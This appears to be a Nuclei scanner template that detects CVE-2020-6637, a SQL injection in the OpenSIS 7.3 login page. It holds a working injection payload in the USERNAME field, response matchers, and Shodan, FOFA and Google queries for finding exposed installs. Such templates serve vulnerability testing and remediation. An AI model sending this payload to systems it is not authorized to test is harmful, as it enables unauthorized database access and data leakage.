http:
- body: 'USERNAME=%27%29or%601%60%3D%601%60%3B--+-&PASSWORD=A&language=en&log=

    '
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'SQL STATEMENT:'
    - <TD>UPDATE login_authentication SET FAILED_LOGIN=FAILED_LOGIN+1 WHERE UPPER(USERNAME)=UPPER(NULL)or`1`=`1`;--
      -')</TD>
  - condition: and
    part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/account/index.php'
  - '{{BaseURL}}/opensis/index.php'
  - '{{BaseURL}}/index.php'
id: CVE-2020-6637
info:
  author: pikpikcu
  classification:
    cpe: cpe:2.3:a:os4ed:opensis:7.3:*:*:*:community:*:*:*
    cve-id: CVE-2020-6637
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.9905
    epss-score: 0.79802
  description: OpenSIS Community Edition version 7.3 is vulnerable to SQL injection
    via the USERNAME parameter of index.php.
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    manipulation, or data leakage.

    '
  metadata:
    fofa-query: title="opensis"
    google-query: intitle:"opensis"
    max-request: 3
    product: opensis
    shodan-query:
    - http.title:"openSIS"
    - http.title:"opensis"
    vendor: os4ed
  name: OpenSIS 7.3 - SQL Injection
  reference:
  - https://cinzinga.com/CVE-2020-6637/
  - https://nvd.nist.gov/vuln/detail/CVE-2020-6637
  - https://sourceforge.net/projects/opensis-ce/files/
  - https://github.com/OS4ED/openSIS-Responsive-Design/commit/1127ae0bb7c3a2883febeabc6b71ad8d73510de8
  - https://opensis.com/
  remediation: 'Apply the latest security patch or upgrade to a patched version of
    OpenSIS.

    '
  severity: critical
  tags: cve,cve2020,sqli,opensis,os4ed,vuln
